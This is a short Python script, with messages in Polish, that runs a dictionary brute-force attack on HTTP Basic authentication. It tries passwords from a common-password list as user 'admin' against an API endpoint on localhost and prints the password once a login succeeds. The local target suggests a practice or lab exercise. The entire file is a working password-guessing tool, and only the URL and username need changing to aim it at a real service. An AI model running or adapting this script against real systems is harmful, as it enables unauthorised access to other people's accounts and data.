import requests
import time

url = 'http://127.0.0.1:5000/api/secret'
USERNAME = 'admin'

WORDLIST_FILE = '10k-most-common.txt'

def brute_force():
    print("Start - Łamanie hasła")

    try:
        with open(WORDLIST_FILE, 'r', encoding='utf-8') as wordlist:
            for word in wordlist:
                password = word.strip()
                
                if not password:
                    continue
                
                print(f"Próba logowania z hasłem: {password}")

                try:
                    response = requests.get(url, auth=(USERNAME, password))

                    if response.status_code == 200:
                        print("Złamano hasło!")
                        print(f"Login: {USERNAME}")
                        print(f"Hasło: {password}")

                        return
                    
                except requests.exceptions.RequestException as e:
                    print(f"Błąd podczas próby logowania: {e}")
                    return
                
                time.sleep(0.01)

    except FileNotFoundError:
        print(f"Plik '{WORDLIST_FILE}' nie został znaleziony.")
        return

if __name__ == '__main__':
    brute_force()